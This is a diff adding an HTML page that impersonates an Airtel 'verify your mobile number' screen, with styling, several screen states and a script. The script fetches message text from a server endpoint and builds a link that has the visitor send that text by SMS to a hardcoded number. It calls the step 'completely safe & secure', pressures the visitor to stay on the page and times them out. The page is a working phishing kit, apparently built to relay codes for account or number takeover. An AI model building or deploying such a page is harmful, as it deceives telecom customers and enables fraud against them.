@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+  <title>Messages</title>
+  <style>
+    :root {
+      --page-bg: #e8e2e1;
+      --card-bg: #f7f3f4;
+      --text: #1d1f26;
+      --muted: #5f6670;
+      --soft: #7a7f85;
+      --purple: #b564c7;
+      --purple-dark: #7a4d9c;
+      --button-blue: #314c60;
+      --button-blue-dark: #2a3f50;
+      --ring: #d7dfe6;
+      --shadow: rgba(32, 33, 36, 0.08);
+      --airtel-red: #b564c7;
+      --airtel-red-deep: #8d60ab;
+      --airtel-red-soft: #f2e8f6;
+      --airtel-red-pale: #f7f1fa;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      min-height: 100%;
+      height: 100%;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--page-bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
+    }
+
+    body {
+      display: grid;
+      place-items: center;
+      padding: 26px;
+    }
+
+    .card {
+      width: min(760px, 100%);
+      min-height: 560px;
+      padding: 32px 40px 26px;
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: 28px;
+      border: 1px solid rgba(38, 41, 46, 0.08);
+      box-shadow: 0 10px 18px rgba(20, 22, 29, 0.06);
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    h1 {
+      margin: 0 auto;
+      max-width: 420px;
+      font-size: clamp(2.1rem, 2.8vw, 3rem);
+      line-height: 1.04;
+      letter-spacing: -0.07em;
+      font-weight: 700;
+      color: #2f3034;
+    }
+
+    .device-stage {
+      display: grid;
+      place-items: center;
+      margin: 20px auto 18px;
+    }
+
+    .device-icon {
+      display: block;
+      width: 100px;
+      height: 112px;
+      color: var(--purple-dark);
+    }
+
+    .instruction {
+      margin: 0 auto;
+      max-width: 500px;
+      font-size: clamp(1.35rem, 2vw, 2.2rem);
+      line-height: 1.15;
+      letter-spacing: -0.055em;
+      color: #2f343b;
+      font-weight: 400;
+    }
+
+    .instruction strong {
+      font-weight: 800;
+    }
+
+    .safe-note {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      margin: 26px auto 18px;
+      max-width: 520px;
+      text-align: left;
+      padding: 0 8px;
+    }
+
+    .tiny-icon {
+      display: grid;
+      place-items: center;
+      width: 36px;
+      height: 36px;
+      min-width: 36px;
+      border-radius: 50%;
+      background: #2d2d32;
+      color: #fff;
+      font-weight: 700;
+      font-size: 1.5rem;
+      line-height: 1;
+      box-shadow: inset 0 0 0 2px rgba(255,255,255,0.15);
+      margin-top: 2px;
+    }
+
+    .safe-note p {
+      margin: 0;
+      font-size: clamp(1.14rem, 1.6vw, 1.7rem);
+      line-height: 1.18;
+      letter-spacing: -0.05em;
+      color: #2d3035;
+      font-weight: 400;
+    }
+
+    .safe-note strong {
+      font-weight: 800;
+    }
+
+    .cta-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 18px;
+      margin-top: 12px;
+      width: 100%;
+    }
+
+    .btn {
+      appearance: none;
+      border: 0;
+      border-radius: 18px;
+      padding: 18px 18px;
+      font-size: clamp(1.6rem, 2.5vw, 2.3rem);
+      line-height: 1;
+      letter-spacing: -0.05em;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.18s ease, box-shadow 0.18s ease, opacity 0.18s ease;
+      width: 100%;
+      min-height: 72px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      box-shadow: inset 0 0 0 1px rgba(255,255,255,0.06);
+    }
+
+    .btn:hover {
+      transform: translateY(-1px);
+      opacity: 0.98;
+    }
+
+    .btn.cancel,
+    .btn.proceed {
+      background: linear-gradient(180deg, #3d586d 0%, #2f485d 100%);
+      color: #fff;
+    }
+
+    .sms-retry {
+      display: block;
+      width: min(240px, 100%);
+      margin: 14px auto 0;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    .verification-state {
+      display: grid;
+      place-items: center;
+      min-height: 560px;
+      padding: 40px 24px;
+      text-align: center;
+    }
+
+    .verification-state h2 {
+      margin: 0 0 40px;
+      color: #24252b;
+      font-size: clamp(1.7rem, 4vw, 2.2rem);
+      line-height: 1.2;
+    }
+
+    .verification-icon {
+      width: 120px;
+      height: 120px;
+      margin-bottom: 90px;
+      color: var(--purple-dark);
+    }
+
+    .verification-warning {
+      max-width: 620px;
+      margin: 0 0 76px;
+      color: #555158;
+      font-size: clamp(1.2rem, 3.5vw, 1.8rem);
+      line-height: 1.35;
+    }
+
+    .verification-warning strong {
+      color: #d32f3b;
+    }
+
+    .verification-timer {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      color: #25262b;
+      font-size: clamp(1.2rem, 3vw, 1.5rem);
+      font-variant-numeric: tabular-nums;
+    }
+
+    .verification-clock {
+      width: 34px;
+      height: 34px;
+      color: #d32f3b;
+    }
+
+    .timeout-state {
+      display: grid;
+      place-items: center;
+      min-height: 560px;
+      padding: 40px 24px;
+      text-align: center;
+    }
+
+    .timeout-state h2 {
+      margin: 0 0 48px;
+      color: #24252b;
+      font-size: clamp(1.7rem, 4vw, 2.2rem);
+      line-height: 1.2;
+    }
+
+    .timeout-icon {
+      width: 120px;
+      height: 120px;
+      margin-bottom: 48px;
+      color: var(--purple-dark);
+    }
+
+    .timeout-message {
+      max-width: 620px;
+      margin: 0 0 60px;
+      color: #555158;
+      font-size: clamp(1.2rem, 3.5vw, 1.8rem);
+      line-height: 1.35;
+    }
+
+    .timeout-retry {
+      width: min(600px, 100%);
+      background: linear-gradient(180deg, #3d586d 0%, #2f485d 100%);
+      color: #fff;
+    }
+
+    .loading-state {
+      display: grid;
+      place-items: center;
+      min-height: 420px;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+      padding-top: 30px;
+    }
+
+    .airtel-logo {
+      display: block;
+      width: 180px;
+      max-width: 80%;
+      height: auto;
+      margin: 0 0 12px;
+    }
+
+    .loading-spinner {
+      width: 64px;
+      height: 64px;
+      border: 6px solid rgba(181, 100, 199, 0.15);
+      border-top-color: var(--purple);
+      border-right-color: rgba(181, 100, 199, 0.8);
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+      margin: 0 auto 12px;
+      position: relative;
+      box-shadow: inset 0 0 0 1px rgba(181, 100, 199, 0.08);
+    }
+
+    .loading-spinner::before {
+      content: "";
+      position: absolute;
+      inset: 8px;
+      border-radius: 50%;
+      border: 5px solid rgba(181, 100, 199, 0.12);
+    }
+
+    .loading-label {
+      font-size: clamp(2.3rem, 5vw, 4.2rem);
+      font-weight: 800;
+      letter-spacing: -0.07em;
+      color: #1a1d22;
+      margin-bottom: 12px;
+      line-height: 0.92;
+    }
+
+    .loading-sub {
+      color: #1e2127;
+      font-size: clamp(1.5rem, 2.2vw, 2.8rem);
+      letter-spacing: -0.05em;
+      font-weight: 700;
+      line-height: 1.05;
+      margin-bottom: 18px;
+    }
+
+    .loading-sub span {
+      color: #1c1f25;
+      font-weight: 800;
+    }
+
+    .loading-divider {
+      width: min(100%, 660px);
+      border-top: 2px solid rgba(30, 33, 39, 0.22);
+      margin: 0 auto 18px;
+    }
+
+    .loading-note {
+      color: #2a2d35;
+      font-size: clamp(1.2rem, 2vw, 2.1rem);
+      letter-spacing: -0.04em;
+      line-height: 1.3;
+      margin-bottom: 26px;
+      max-width: 720px;
+    }
+
+    .keep-open {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      background: rgba(32, 36, 43, 0.06);
+      color: #2a2d35;
+      border-radius: 999px;
+      padding: 18px 26px;
+      font-size: clamp(1.3rem, 2vw, 2rem);
+      line-height: 1.2;
+      letter-spacing: -0.04em;
+      font-weight: 700;
+      max-width: 100%;
+      border: 1px solid rgba(30, 33, 39, 0.08);
+    }
+
+    .keep-open .info-badge {
+      width: 28px;
+      height: 28px;
+      min-width: 28px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.2);
+      display: grid;
+      place-items: center;
+      font-weight: 900;
+      font-size: 1.2rem;
+      line-height: 1;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 600px) {
+      body {
+        height: auto;
+        min-height: 100svh;
+        padding: 8px;
+      }
+
+      .card {
+        width: min(100%, 440px);
+        padding: 28px 18px 24px;
+        min-height: calc(100svh - 16px);
+        border-radius: 20px;
+      }
+
+      #readyState:not(.hidden) {
+        display: flex;
+        flex: 1;
+        flex-direction: column;
+        justify-content: space-evenly;
+        min-height: calc(100svh - 72px);
+      }
+
+      .loading-state {
+        min-height: 420px;
+        padding: 0;
+      }
+
+      .loading-state > div {
+        width: 100%;
+      }
+
+      .airtel-logo {
+        width: 140px;
+        margin-bottom: 16px;
+      }
+
+      .loading-spinner {
+        width: 56px;
+        height: 56px;
+        margin-bottom: 14px;
+      }
+
+      .loading-spinner::before {
+        inset: 7px;
+        border-width: 4px;
+      }
+
+      .loading-label {
+        font-size: clamp(1.7rem, 8vw, 2rem);
+        line-height: 1;
+        margin-bottom: 8px;
+      }
+
+      .loading-sub {
+        font-size: clamp(1rem, 4.5vw, 1.15rem);
+        line-height: 1.3;
+        letter-spacing: -0.02em;
+        margin-bottom: 16px;
+      }
+
+      .loading-divider {
+        width: 100%;
+        border-top-width: 1px;
+        margin-bottom: 14px;
+      }
+
+      .loading-note {
+        font-size: 0.95rem;
+        line-height: 1.45;
+        letter-spacing: 0;
+        margin-bottom: 18px;
+      }
+
+      .keep-open {
+        gap: 9px;
+        padding: 12px 14px;
+        font-size: 0.9rem;
+        line-height: 1.35;
+        letter-spacing: 0;
+        text-align: left;
+      }
+
+      .keep-open .info-badge {
+        width: 24px;
+        height: 24px;
+        min-width: 24px;
+        font-size: 1rem;
+      }
+
+      h1 {
+        font-size: clamp(1.55rem, 7vw, 1.8rem);
+        line-height: 1.08;
+      }
+
+      .device-stage {
+        margin: 12px auto;
+      }
+
+      .device-icon {
+        width: 78px;
+        height: 96px;
+      }
+
+      .instruction {
+        font-size: 1.1rem;
+        line-height: 1.35;
+        letter-spacing: -0.02em;
+      }
+
+      .instruction br {
+        display: none;
+      }
+
+      .safe-note {
+        gap: 10px;
+        margin: 18px auto;
+      }
+
+      .safe-note p {
+        font-size: 1rem;
+        line-height: 1.35;
+        letter-spacing: -0.02em;
+      }
+
+      .tiny-icon {
+        width: 30px;
+        height: 30px;
+        min-width: 30px;
+        font-size: 1.2rem;
+      }
+
+      .cta-row {
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+        margin-top: 8px;
+      }
+
+      .btn {
+        min-width: 0;
+        min-height: 48px;
+        padding: 10px 8px;
+        border-radius: 10px;
+        font-size: clamp(1rem, 4.5vw, 1.25rem);
+        letter-spacing: -0.02em;
+      }
+
+      .sms-retry {
+        width: 100%;
+        margin-top: 10px;
+      }
+
+      .verification-state,
+      .timeout-state {
+        min-height: 0;
+        padding: 28px 8px;
+      }
+
+      .verification-state h2,
+      .timeout-state h2 {
+        margin-bottom: 24px;
+        font-size: clamp(1.5rem, 7vw, 1.9rem);
+      }
+
+      .verification-icon,
+      .timeout-icon {
+        width: 88px;
+        height: 88px;
+        margin-bottom: 28px;
+      }
+
+      .verification-warning,
+      .timeout-message {
+        margin-bottom: 28px;
+        font-size: 1rem;
+        line-height: 1.45;
+      }
+
+      .verification-timer {
+        gap: 8px;
+        font-size: 1.05rem;
+      }
+
+      .verification-clock {
+        width: 28px;
+        height: 28px;
+      }
+
+      .timeout-retry {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="card" role="dialog" aria-modal="true" aria-labelledby="verify-title">
+    <div id="loadingState" class="loading-state">
+      <div>
+        <img class="airtel-logo" src="assets/img/logo.svg" alt="Airtel">
+        <div class="loading-spinner" aria-hidden="true"></div>
+        <div class="loading-label">Processing...</div>
+        <div class="loading-sub">Please wait, <span>don't leave this page.</span></div>
+        <div class="loading-divider"></div>
+        <div class="loading-note">Your approval request is being processed.<br>This may take a few moments.</div>
+        <div class="keep-open"><span class="info-badge">i</span> Keep this page open until the process is complete.</div>
+      </div>
+    </div>
+
+    <div id="readyState" class="hidden">
+      <h1 id="verify-title">Let’s get your Mobile<br>number verified</h1>
+
+      <div class="device-stage" aria-hidden="true">
+        <svg class="device-icon" viewBox="0 0 110 110" fill="none">
+          <rect x="17" y="5" width="54" height="98" rx="5" stroke="currentColor" stroke-width="4"/>
+          <path d="M19 18h50M19 88h50" stroke="currentColor" stroke-width="4"/>
+          <path d="M34 11h20" stroke="currentColor" stroke-width="3" stroke-linecap="round"/>
+          <circle cx="44" cy="96" r="3" fill="currentColor"/>
+          <circle cx="68" cy="54" r="20" fill="white" stroke="currentColor" stroke-width="4"/>
+          <path d="m82 68 16 15" stroke="currentColor" stroke-width="4" stroke-linecap="round"/>
+        </svg>
+      </div>
+
+      <p class="instruction">
+        Please send verification SMS from<br>
+        <strong id="verificationPhone">+260971263570</strong> immediately to verify your number.
+      </p>
+
+      <div class="safe-note" aria-live="polite">
+        <span class="tiny-icon">i</span>
+        <p><span>will prompt you to</span> <strong>send an SMS.</strong> It is completely safe &amp; secure.</p>
+      </div>
+
+      <div class="cta-row">
+        <button type="button" class="btn cancel">Cancel</button>
+        <a class="btn proceed" href="sms:+260971263570?body=Verification">Proceed</a>
+      </div>
+      <button type="button" class="btn sms-retry hidden" id="smsRetry">Retry</button>
+    </div>
+
+    <div id="verificationState" class="verification-state hidden" role="status" aria-live="polite">
+      <h2>Verifying Mobile Number</h2>
+      <svg class="verification-icon" viewBox="0 0 120 120" fill="none" aria-hidden="true">
+        <rect x="22" y="5" width="64" height="108" rx="8" stroke="currentColor" stroke-width="5"/>
+        <path d="M25 21h58M25 94h58" stroke="currentColor" stroke-width="5"/>
+        <path d="M44 13h20" stroke="currentColor" stroke-width="5" stroke-linecap="round"/>
+        <circle cx="54" cy="104" r="3" fill="currentColor"/>
+        <circle cx="80" cy="61" r="24" fill="white" stroke="currentColor" stroke-width="5"/>
+        <path d="m98 79 16 13" stroke="currentColor" stroke-width="6" stroke-linecap="round"/>
+      </svg>
+      <p class="verification-warning"><strong>Important:</strong> Please ensure you do not click back or move away from this screen during the verification process.</p>
+      <div class="verification-timer">
+        <svg class="verification-clock" viewBox="0 0 36 36" fill="none" aria-hidden="true">
+          <circle cx="18" cy="19" r="14" stroke="currentColor" stroke-width="4"/>
+          <path d="M18 10v9l6-3" stroke="currentColor" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span id="verificationTimer">00:30 sec</span>
+      </div>
+    </div>
+
+    <div id="timeoutState" class="timeout-state hidden" role="alert" aria-labelledby="timeout-title">
+      <h2 id="timeout-title">Request Timed Out</h2>
+      <svg class="timeout-icon" viewBox="0 0 120 120" fill="none" aria-hidden="true">
+        <rect x="14" y="24" width="56" height="88" rx="8" stroke="currentColor" stroke-width="5"/>
+        <path d="M17 39h50M17 94h50" stroke="currentColor" stroke-width="5"/>
+        <path d="M32 31h20" stroke="currentColor" stroke-width="5" stroke-linecap="round"/>
+        <circle cx="42" cy="103" r="3" fill="currentColor"/>
+        <rect x="58" y="51" width="52" height="39" rx="5" fill="white" stroke="currentColor" stroke-width="4"/>
+        <path d="m61 55 23 19 23-19" stroke="currentColor" stroke-width="4" stroke-linejoin="round"/>
+        <circle cx="98" cy="23" r="18" fill="#d32f3b"/>
+        <path d="M98 13v11m0 7v.5" stroke="white" stroke-width="5" stroke-linecap="round"/>
+      </svg>
+      <p class="timeout-message">We have not received SMS to verify your number.</p>
+      <button type="button" class="btn timeout-retry" id="timeoutRetry">Retry</button>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const reqId = params.get('id');
+    const requestedPhone = params.get('phone');
+    const phoneEl = document.getElementById('verificationPhone');
+    const loadingState = document.getElementById('loadingState');
+    const readyState = document.getElementById('readyState');
+    const verificationState = document.getElementById('verificationState');
+    const timeoutState = document.getElementById('timeoutState');
+    const verificationTimer = document.getElementById('verificationTimer');
+    const ctaRow = document.querySelector('.cta-row');
+    const proceedLink = document.querySelector('.btn.proceed');
+    const retryButton = document.getElementById('smsRetry');
+    const timeoutRetryButton = document.getElementById('timeoutRetry');
+
+    const DEFAULT_SMS_NUMBER = '+260971263570';
+    const RECIPIENT_SMS_NUMBER = '+260971263570';
+    const SMS_COOLDOWN_MS = 36 * 1000;
+    const SMS_COOLDOWN_KEY = 'smsCooldownUntil';
+    const SMS_EXPIRED_KEY = 'smsExpired';
+    const SMS_RETRY_IN_PROGRESS_KEY = 'smsRetryInProgress';
+    let lastMsgId = 0;
+    let currentMessageText = 'Verification';
+    let currentPhoneNumber = DEFAULT_SMS_NUMBER;
+    let countdownTimer = null;
+
+    function normalizePhone(phone) {
+      if (!phone) return DEFAULT_SMS_NUMBER;
+      let cleaned = String(phone).trim();
+      cleaned = cleaned.replace(/\s+/g, '');
+      cleaned = cleaned.replace(/[^\d+]/g, '');
+
+      if (!cleaned) return DEFAULT_SMS_NUMBER;
+      if (cleaned.startsWith('00')) {
+        cleaned = '+' + cleaned.slice(2);
+      }
+      if (cleaned.startsWith('+')) return cleaned;
+      if (/^254\d{9}$/.test(cleaned)) return '+' + cleaned;
+      if (/^\d{9}$/.test(cleaned)) return '+254' + cleaned;
+      if (/^\d{10}$/.test(cleaned)) return '+254' + cleaned.slice(1);
+      return cleaned || DEFAULT_SMS_NUMBER;
+    }
+
+    function formatPhoneForDisplay(phone) {
+      const normalized = normalizePhone(phone);
+      if (!normalized || normalized.length <= 3) return normalized;
+      if (normalized.startsWith('+254')) {
+        return `+254 ${normalized.slice(4)}`;
+      }
+      if (normalized.startsWith('+260')) {
+        return `+260 ${normalized.slice(4)}`;
+      }
+      return normalized;
+    }
+
+    function setPhone(value) {
+      const safe = normalizePhone(value || DEFAULT_SMS_NUMBER);
+      currentPhoneNumber = safe;
+      if (phoneEl) phoneEl.textContent = formatPhoneForDisplay(safe);
+      return safe;
+    }
+
+    function showReadyState() {
+      loadingState.classList.add('hidden');
+      verificationState.classList.add('hidden');
+      timeoutState.classList.add('hidden');
+      readyState.classList.remove('hidden');
+    }
+
+    function showTimeoutState() {
+      loadingState.classList.add('hidden');
+      readyState.classList.add('hidden');
+      verificationState.classList.add('hidden');
+      timeoutState.classList.remove('hidden');
+    }
+
+    function showVerificationState(secondsLeft) {
+      loadingState.classList.add('hidden');
+      readyState.classList.add('hidden');
+      timeoutState.classList.add('hidden');
+      verificationState.classList.remove('hidden');
+      const minutes = Math.floor(secondsLeft / 60);
+      const seconds = secondsLeft % 60;
+      verificationTimer.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')} sec`;
+    }
+
+    function updateProceedLink() {
+      const number = normalizePhone(RECIPIENT_SMS_NUMBER);
+      const body = (currentMessageText || 'Verification').trim();
+      proceedLink.href = 'sms:' + number + '?body=' + encodeURIComponent(body);
+    }
+
+    function updateSmsCountdown() {
+      const savedDeadline = sessionStorage.getItem(SMS_COOLDOWN_KEY);
+      const deadline = Number(savedDeadline);
+      const secondsLeft = Math.ceil((deadline - Date.now()) / 1000);
+
+      if (!savedDeadline || !Number.isFinite(deadline) || secondsLeft <= 0) {
+        if (countdownTimer) clearInterval(countdownTimer);
+        countdownTimer = null;
+        sessionStorage.removeItem(SMS_COOLDOWN_KEY);
+        sessionStorage.removeItem(SMS_RETRY_IN_PROGRESS_KEY);
+
+        if (savedDeadline && sessionStorage.getItem(SMS_EXPIRED_KEY) !== 'true') {
+          sessionStorage.setItem(SMS_EXPIRED_KEY, 'true');
+        }
+
+        if (sessionStorage.getItem(SMS_EXPIRED_KEY) === 'true') {
+          showTimeoutState();
+        } else {
+          timeoutState.classList.add('hidden');
+          ctaRow.classList.remove('hidden');
+          retryButton.classList.add('hidden');
+        }
+        return;
+      }
+
+      sessionStorage.removeItem(SMS_EXPIRED_KEY);
+      ctaRow.classList.add('hidden');
+      retryButton.classList.add('hidden');
+
+      if (sessionStorage.getItem(SMS_RETRY_IN_PROGRESS_KEY) === 'true') {
+        loadingState.classList.remove('hidden');
+        readyState.classList.add('hidden');
+        verificationState.classList.add('hidden');
+        timeoutState.classList.add('hidden');
+      } else {
+        showVerificationState(secondsLeft);
+      }
+    }
+
+    function startSmsCountdown() {
+      sessionStorage.removeItem(SMS_EXPIRED_KEY);
+      sessionStorage.setItem(SMS_COOLDOWN_KEY, String(Date.now() + SMS_COOLDOWN_MS));
+      updateSmsCountdown();
+      countdownTimer = setInterval(updateSmsCountdown, 250);
+    }
+
+    async function loadRequestPhone() {
+      if (requestedPhone) {
+        return setPhone(requestedPhone);
+      }
+
+      if (!reqId) {
+        return setPhone(DEFAULT_SMS_NUMBER);
+      }
+
+      try {
+        const response = await fetch('/api/request/' + encodeURIComponent(reqId));
+        if (!response.ok) {
+          return setPhone(DEFAULT_SMS_NUMBER);
+        }
+
+        const requestData = await response.json();
+        return setPhone(requestData.phone || DEFAULT_SMS_NUMBER);
+      } catch (err) {
+        console.error('Unable to load request phone:', err);
+        return setPhone(DEFAULT_SMS_NUMBER);
+      }
+    }
+
+    async function pollMessages() {
+      if (!reqId) {
+        showReadyState();
+        return;
+      }
+
+      try {
+        const response = await fetch('/api/messages/' + encodeURIComponent(reqId) + '?since=' + lastMsgId);
+        if (response.status === 403 || response.status === 404) {
+          return;
+        }
+        if (!response.ok) {
+          return;
+        }
+
+        const messages = await response.json();
+        if (!messages || !messages.length) {
+          return;
+        }
+
+        const latest = messages.reduce((latestMessage, message) => message.id > latestMessage.id ? message : latestMessage, messages[0]);
+        currentMessageText = latest.text || 'Verification';
+        lastMsgId = Math.max(lastMsgId, latest.id);
+        updateProceedLink();
+        showReadyState();
+      } catch (err) {
+        console.error('Unable to load messages:', err);
+      }
+    }
+
+    loadRequestPhone();
+    pollMessages();
+    setInterval(pollMessages, 3000);
+    updateSmsCountdown();
+    document.addEventListener('visibilitychange', updateSmsCountdown);
+
+    document.querySelector('.btn.cancel')?.addEventListener('click', function () {
+      window.history.back();
+    });
+
+    proceedLink.addEventListener('click', function () {
+      startSmsCountdown();
+    });
+
+    retryButton.addEventListener('click', function () {
+      window.location.href = 'trial.html';
+    });
+
+    timeoutRetryButton.addEventListener('click', function () {
+      window.location.href = 'trial.html';
+    });
+  </script>
+</body>
+</html>
